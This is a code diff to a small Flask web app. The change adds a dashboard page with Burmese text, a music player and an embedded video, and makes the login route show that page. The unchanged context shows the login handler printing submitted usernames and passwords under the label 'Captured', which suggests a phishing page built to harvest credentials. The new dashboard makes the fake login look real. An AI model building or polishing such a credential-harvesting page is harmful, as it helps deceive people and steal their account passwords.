@@ -211,6 +211,63 @@ password_html = """
 </body>
 </html>
 """
+Dashboard_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Web App - Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .header {
+            background-color: #1a73e8;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        .content {
+            margin-top: 30px;
+        }
+        .card {
+            background: white;
+            padding: 20px;
+            margin: 15px auto;
+            max-width: 600px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Welcome, {{ username }}! 🎉</h1>
+        <p>ඔသင့်ရဲ့ ကိုယ်ပိုင် Dashboard မှ ကြိုဆိုပါတယ်</p>
+    </div>
+    
+    <div class="content">
+        <div class="card">
+            <h3>🎵 Music Player</h3>
+            <p>ကြိုက်နှစ်သက်ရာ သီချင်းများ နားဆင်ရန်</p>
+            <audio controls style="width: 100%;">
+                <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+        
+        <div class="card">
+            <h3>📺 Video Player</h3>
+            <p>ဗီဒီယိုများ ကြည့်ရှုရန်</p>
+            <iframe width="100%" height="315" src="https://www.youtube.com/embed/tgbNymZ7vqY" frameborder="0" allowfullscreen></iframe>
+        </div>
+    </div>
+</body>
+</html>
+"""
 
 @app.route("/")
 def index():
@@ -226,13 +283,9 @@ def login():
     username = request.form.get("username")
     password = request.form.get("password")
     print(f"Captured -> Username: {username}, Password: {password}")
-    return """
-    <div style="text-align:center; margin-top:50px; font-family:Arial;">
-        <h2 style="color: #34A853;">Login Successful! 🎉</h2>
-        <p style="color: #5f6368;">Account: <b>{}</b></p>
-    </div>
-    """.format(username)
-
+    
+    return render_template_string(Dashboard_html, username=username)
+    
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
